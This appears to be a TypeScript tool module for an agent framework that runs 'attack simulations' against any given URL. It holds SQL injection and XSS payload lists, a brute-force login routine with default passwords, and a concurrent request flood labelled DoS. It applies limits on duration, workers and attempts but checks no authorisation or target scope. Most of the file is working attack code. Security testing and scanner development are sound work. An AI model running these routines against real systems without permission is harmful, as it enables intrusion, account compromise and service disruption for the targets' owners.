import { BaseTool, ToolResult } from '../core/base-tool';

const SQL_PAYLOADS = [
  "'",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "admin' --",
  "' UNION SELECT NULL--",
  "1' AND '1'='1",
  "1' AND '1'='2",
];

const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  "javascript:alert('XSS')",
];

const DEFAULT_PASSWORDS = ['admin', '123456', 'password', 'root', 'test'];
const SQL_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /warning:\s*mysql/i,
  /postgresql/i,
  /sqlite error/i,
  /odbc/i,
  /sqlstate/i,
];

function toStringArray(value: unknown): string[] {
  if (!Array.isArray(value)) {
    return [];
  }
  return value.filter((item): item is string => typeof item === 'string');
}

function clamp(value: unknown, fallback: number, min: number, max: number): number {
  const n = Number(value);
  if (!Number.isFinite(n)) {
    return fallback;
  }
  return Math.min(Math.max(Math.floor(n), min), max);
}

function setQueryParam(rawUrl: string, key: string, value: string): string {
  const url = new URL(rawUrl);
  url.searchParams.set(key, value);
  return url.toString();
}

async function safeReadText(response: Response, maxLen = 8000): Promise<string> {
  const text = await response.text();
  return text.length > maxLen ? text.slice(0, maxLen) : text;
}

export class AttackTestTool extends BaseTool {
  constructor() {
    super(
      'attack_test',
      'Run controlled attack simulation routines (SQLi/XSS/brute force/DoS) for validation.',
      true,
    );
  }

  async run(params: Record<string, unknown>): Promise<ToolResult> {
    const attackType = String(params.attack_type ?? '').trim();
    const targetUrl = String(params.target_url ?? '').trim();
    if (!attackType || !targetUrl) {
      return { success: false, result: null, error: 'Missing parameters: attack_type and target_url' };
    }

    try {
      switch (attackType) {
        case 'sql_injection':
          return { success: true, result: await this.sqlInjection(targetUrl, String(params.parameter ?? 'id')) };
        case 'xss':
          return { success: true, result: await this.xss(targetUrl, String(params.parameter ?? 'q')) };
        case 'brute_force':
          return {
            success: true,
            result: await this.bruteForce(
              targetUrl,
              String(params.username ?? 'admin'),
              toStringArray(params.passwords).length > 0 ? toStringArray(params.passwords) : DEFAULT_PASSWORDS,
            ),
          };
        case 'dos':
          return {
            success: true,
            result: await this.dos(
              targetUrl,
              clamp(params.duration, 5, 1, 30),
              clamp(params.concurrent, 20, 1, 30),
            ),
          };
        default:
          return {
            success: false,
            result: null,
            error: `Unsupported attack_type: ${attackType}`,
          };
      }
    } catch (error) {
      return { success: false, result: null, error: (error as Error).message };
    }
  }

  private async sqlInjection(targetUrl: string, parameter: string): Promise<Record<string, unknown>> {
    const findings: Array<Record<string, unknown>> = [];
    for (const payload of SQL_PAYLOADS) {
      try {
        const url = setQueryParam(targetUrl, parameter || 'id', payload);
        const response = await fetch(url, { method: 'GET', redirect: 'manual' });
        const body = await safeReadText(response);
        const vulnerable = response.status >= 500 || SQL_ERROR_PATTERNS.some((pattern) => pattern.test(body));
        if (vulnerable) {
          findings.push({
            payload,
            status: response.status,
            indicator: response.status >= 500 ? 'server_error' : 'sql_error_pattern',
          });
        }
      } catch {
        // ignore per-case transport errors
      }
    }

    return {
      attack_type: 'sql_injection',
      target_url: targetUrl,
      parameter: parameter || 'id',
      tested: SQL_PAYLOADS.length,
      vulnerable: findings.length > 0,
      findings,
    };
  }

  private async xss(targetUrl: string, parameter: string): Promise<Record<string, unknown>> {
    const findings: Array<Record<string, unknown>> = [];
    for (const payload of XSS_PAYLOADS) {
      try {
        const url = setQueryParam(targetUrl, parameter || 'q', payload);
        const response = await fetch(url, { method: 'GET', redirect: 'manual' });
        const body = await safeReadText(response);
        const reflected =
          body.includes(payload) ||
          body.includes(payload.replace(/'/g, '&#39;')) ||
          body.includes(payload.replace(/</g, '&lt;'));
        if (reflected) {
          findings.push({
            payload,
            status: response.status,
            reflected: true,
          });
        }
      } catch {
        // ignore per-case transport errors
      }
    }

    return {
      attack_type: 'xss',
      target_url: targetUrl,
      parameter: parameter || 'q',
      tested: XSS_PAYLOADS.length,
      vulnerable: findings.length > 0,
      findings,
    };
  }

  private async bruteForce(
    targetUrl: string,
    username: string,
    passwords: string[],
  ): Promise<Record<string, unknown>> {
    const tested = passwords.slice(0, 20);
    const attempts: Array<Record<string, unknown>> = [];
    for (const password of tested) {
      try {
        const body = new URLSearchParams({
          username,
          password,
          login: 'submit',
        }).toString();
        const response = await fetch(targetUrl, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body,
          redirect: 'manual',
        });
        const responseText = (await safeReadText(response, 3000)).toLowerCase();
        const likelySuccess =
          response.status < 400 &&
          !/(invalid|incorrect|failed|error|denied|captcha|locked)/i.test(responseText);
        attempts.push({
          password,
          status: response.status,
          likely_success: likelySuccess,
        });
      } catch (error) {
        attempts.push({
          password,
          status: null,
          likely_success: false,
          error: (error as Error).message,
        });
      }
    }

    const positives = attempts.filter((item) => item.likely_success === true).length;
    return {
      attack_type: 'brute_force',
      target_url: targetUrl,
      username,
      tested: attempts.length,
      likely_success_count: positives,
      attempts,
    };
  }

  private async dos(
    targetUrl: string,
    durationSec: number,
    concurrent: number,
  ): Promise<Record<string, unknown>> {
    const endAt = Date.now() + durationSec * 1000;
    let success = 0;
    let failed = 0;

    const worker = async (): Promise<void> => {
      while (Date.now() < endAt) {
        try {
          const response = await fetch(targetUrl, { method: 'GET', redirect: 'manual' });
          if (response.status > 0) {
            success += 1;
          } else {
            failed += 1;
          }
        } catch {
          failed += 1;
        }
      }
    };

    await Promise.all(Array.from({ length: concurrent }, () => worker()));

    return {
      attack_type: 'dos',
      target_url: targetUrl,
      duration_seconds: durationSec,
      concurrent_workers: concurrent,
      total_requests: success + failed,
      successful_requests: success,
      failed_requests: failed,
      note: 'Controlled stress routine with bounded duration and concurrency.',
    };
  }
}
